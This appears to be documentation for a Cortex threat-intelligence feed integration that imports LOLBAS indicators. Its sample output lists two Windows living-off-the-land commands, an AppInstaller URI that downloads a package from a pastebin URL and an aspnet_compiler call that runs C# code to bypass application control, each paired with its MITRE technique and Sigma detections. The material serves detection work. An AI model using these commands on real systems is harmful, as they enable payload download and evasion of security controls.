This integration was integrated and tested with version v1 of LOLBAS.

## Configure LOLBAS Feed in Cortex


| **Parameter** | **Description** | **Required** |
| --- | --- | --- |
| Base URL |  | True |
| Fetch indicators |  | False |
| Indicator Reputation | Indicators from this integration instance will be marked with this reputation. | False |
| Source Reliability | Reliability of the source providing the intelligence data. | True |
| Traffic Light Protocol Color | The Traffic Light Protocol \(TLP\) designation to apply to indicators fetched from the feed. | False |
| Bypass exclusion list | When selected, the exclusion list is ignored for indicators from this feed. This means that if an indicator from this feed is on the exclusion list, the indicator might still be added to the system. | False |
| Use system proxy settings |  | False |
| Trust any certificate (not secure) |  | False |
| Tags | Supports CSV values. | False |
| Create relationships |  | False |
| Feed Fetch Interval |  | False |


## Commands

You can execute these commands from the CLI, as part of an automation, or in a playbook.
After you successfully execute a command, a DBot message appears in the War Room with the command details.

### lolbas-get-indicators

***
Retrieves a limited number of indicators.

#### Base Command

`lolbas-get-indicators`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| limit | The maximum number of indicators to return. | Required | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| LOLBAS.Indicators.Commands.category | String | The category of the command. | 
| LOLBAS.Indicators.Commands.command | String | The command. | 
| LOLBAS.Indicators.Commands.description | String | The description of the command. | 
| LOLBAS.Indicators.Commands.mitreid | String | The MITRE ID related to the command. | 
| LOLBAS.Indicators.Commands.operatingsystem | String | The operating system the command ran on. | 
| LOLBAS.Indicators.Commands.privileges | String | The privileges required to run the command. | 
| LOLBAS.Indicators.Commands.usecase | String | The use case of the command. | 
| LOLBAS.Indicators.Description | String | The description of the indicator. | 
| LOLBAS.Indicators.Detections.content | String | The content of the detection. | 
| LOLBAS.Indicators.Detections.type | String | The type of the detection. | 
| LOLBAS.Indicators.Name | String | The name of the indicator. | 
| LOLBAS.Indicators.Paths.path | String | The path of the indicator. | 
| LOLBAS.Indicators.Type | String | The type of the indicator. | 

#### Command example
```!lolbas-get-indicators limit=2```
#### Context Example
```json
{
    "LOLBAS": {
        "Indicators": [
            {
                "Commands": [
                    {
                        "category": "Download",
                        "command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
                        "description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
                        "mitreid": "Ingress Tool Transfer",
                        "operatingsystem": "Windows 10, Windows 11",
                        "privileges": "User",
                        "usecase": "Download file from Internet"
                    }
                ],
                "Description": "Tool used for installation of AppX/MSIX applications on Windows 10",
                "Detections": [
                    {
                        "content": "https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml",
                        "type": "Sigma"
                    }
                ],
                "Name": "AppInstaller.exe",
                "Paths": [
                    {
                        "path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
                    }
                ],
                "Type": "Tool"
            },
            {
                "Commands": [
                    {
                        "category": "AWL Bypass",
                        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
                        "description": "Execute C# code with the Build Provider and proper folder structure in place.",
                        "mitreid": "Trusted Developer Utilities Proxy Execution",
                        "operatingsystem": "Windows 10, Windows 11",
                        "privileges": "User",
                        "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions"
                    }
                ],
                "Description": "ASP.NET Compilation Tool",
                "Detections": [
                    {
                        "content": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules",
                        "type": "BlockRule"
                    },
                    {
                        "content": "https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_aspnet_compiler.yml",
                        "type": "Sigma"
                    }
                ],
                "Name": "Aspnet_Compiler.exe",
                "Paths": [
                    {
                        "path": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
                    },
                    {
                        "path": "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
                    }
                ],
                "Type": "Tool"
            }
        ]
    }
}
```

#### Human Readable Output

>### LOLBAS indicators
>|Name|Description|
>|---|---|
>| AppInstaller.exe | Tool used for installation of AppX/MSIX applications on Windows 10 |
>| Aspnet_Compiler.exe | ASP.NET Compilation Tool |
